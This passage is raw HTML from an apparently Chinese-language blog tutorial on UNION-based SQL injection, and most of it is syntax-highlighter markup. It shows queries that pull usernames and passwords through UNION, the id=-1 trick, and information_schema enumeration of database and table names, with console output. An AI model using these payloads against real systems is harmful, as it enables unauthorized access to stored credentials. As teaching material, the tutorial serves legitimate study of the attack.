&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
SELECT id, title FROM article&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3290787507913-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3290787507913-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;SELECT &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;title &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;FROM &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;article&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0005 seconds] --&gt;
&lt;p&gt;的结果是&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1 Hello, World&lt;/code&gt;&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c3293851150230&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
SELECT username, password FROM account
UNION 
SELECT id, title FROM article&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3293851150230-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3293851150230-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3293851150230-3&quot;&gt;3&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3293851150230-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;SELECT &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;password &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;FROM &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;account&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3293851150230-2&quot;&gt;&lt;span class=&quot;crayon-e&quot;&gt;UNION &lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3293851150230-3&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;SELECT &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;title &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;FROM &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;article&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0006 seconds] --&gt;
&lt;p&gt;的结果就是&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin 123456&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1 Hello, World&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;比起多重嵌套的boolean注入，union注入相对轻松。因为，union注入可以直接返回信息而不是布尔值。&lt;strong&gt;前面的介绍看出把union会把结果拼拼到一起，所有要让union前面的查询返回一个空值，一般采用类似于id=-1的方式。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1)&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c3296060652961&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
mysql&amp;gt; select name from students where id = -1 union select schema_name from information_schema.schemata;   //数据库名  
+--------------------+
| name               |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| rumRaisin          |
| t3st               |
| test               |
+--------------------+
6 rows in set (0.00 sec)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3296060652961-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3296060652961-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3296060652961-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3296060652961-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3296060652961-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3296060652961-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3296060652961-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3296060652961-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3296060652961-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3296060652961-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3296060652961-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3296060652961-12&quot;&gt;12&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3296060652961-1&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;select &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;name &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;students &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;where &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;union &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;select &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;schema_name &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;schemata&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//数据库名  &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3296060652961-2&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3296060652961-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3296060652961-4&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3296060652961-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3296060652961-6&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3296060652961-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;performance_schema&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3296060652961-8&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rumRaisin&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3296060652961-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;t3st&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3296060652961-10&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3296060652961-11&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3296060652961-12&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;rows &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.00&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0024 seconds] --&gt;
&lt;p&gt;2)&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c3299396108811&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
mysql&amp;gt; select name from students where id = -1 union select table_name from information_schema.tables where table_schema=&#39;t3st&#39;;    //表名
+----------+
| name     |
+----------+
| master   |
| students |
+----------+
2   rows in set (0.00 sec)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3299396108811-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3299396108811-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3299396108811-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3299396108811-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3299396108811-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3299396108811-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3299396108811-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3299396108811-8&quot;&gt;8&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3299396108811-1&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;select &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;name &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;students &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;where &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;union &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;select &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;table_name &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;tables &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;where &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;table_schema&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;t3st&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//表名&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3299396108811-2&quot;&gt;
